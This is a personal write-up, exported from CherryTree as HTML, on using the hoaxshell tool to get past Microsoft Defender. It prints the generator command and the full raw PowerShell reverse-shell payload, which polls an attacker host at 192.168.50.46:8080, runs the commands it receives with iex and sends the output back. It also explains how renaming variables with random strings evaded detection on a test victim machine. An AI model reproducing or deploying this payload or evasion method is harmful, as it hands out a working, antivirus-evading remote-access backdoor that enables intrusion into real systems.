<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>hoaxshell</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>hoaxshell</h1><br/><p>Feb 23,2024</p><p>```</p><p>So I just want to share my writeup because I&#39;ve been trying to bypass defender for sometime now and this is the first time I Officially bypassed Defender , I&#39;ve spent countless hours obfuscating my powershell command using unicorn, invoke-obfuscation and chimera , I would highly suggest to watch t3l3machus it definitely helped me to bypass defender,  thank you brother</p><p>```</p><p></p><p></p><p></p><p><img src="images/2-1.png" alt="images/2-1.png" /></p><p></p><p></p><p></p><p>#1 . Create a shell using Hoaxshell </p><p>I used this command, </p><p></p><p><span style="background-color:#a51d2d;">./hoaxshell.py  -s 192.168.50.46 -r -H &#39;Authorization&#39;</span></p><p></p><p>-r = raw payload</p><p>-H = additional hoaxshell tag to bypass defender</p><p></p><p></p><p>and then it will spit out this shell here</p><p></p><p>```</p><p>$s=&#39;192.168.50.46:8080&#39;;$i=&#39;db6a3b05-dc656d46-1fb446ac&#39;;$p=&#39;<a href="http://';$v=Invoke-WebRequest">http://&#39;;$v=Invoke-WebRequest</a> -UseBasicParsing -Uri $p$s/db6a3b05 -Headers @{&quot;Authorization&quot;=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/dc656d46 -Headers @{&quot;Authorization&quot;=$i}).Content;if ($c -ne &#39;None&#39;) {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/1fb446ac -Method POST -Headers @{&quot;Authorization&quot;=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join &#39; &#39;)} sleep 0.8}</p><p>```</p><p><img src="images/2-2.png" alt="images/2-2.png" /></p><p></p><p>```</p><p>this raw payload would be flagged down by microsoft so I used variable substitution I learned from t3l3machus,</p><p>Using python I used uuid module as well to create random strings</p><p></p><p>python commands I used to spit out 10 random strings</p><p></p><p>import uuid</p><p>uuid.uuid4().hex</p><p>for i in range(10):</p><p> uuid.uuid4().hex</p><p></p><p></p><p>```</p><p><img src="images/2-3.png" alt="images/2-3.png" /></p><p></p><p></p><p>```</p><p>and then I opened sublime text to edit some variables ,  I  changed 7 variables from the raw payload before, to look like this, </p><p>```</p><p><img src="images/2-4.png" alt="images/2-4.png" /></p><p></p><p>```</p><p>and then I tested it in my victim machine with Microsoft Defender active , and it WORKS!!! </p><p>```</p><p><img src="images/2-5.png" alt="images/2-5.png" /></p><p></p><p></p><p>```</p><p>I waited for 15mins to check if I would be disconnected.... I noticed that I am not getting disconnected even when I am executing commands like ipconfig,sysinfo,whoami etc... , The only time I got disconnected was when I created a file in the desktop folder</p><p>```</p><p><img src="images/2-6.png" alt="images/2-6.png" /></p><p></p><p>```</p><p></p></div>
</body>
</html>
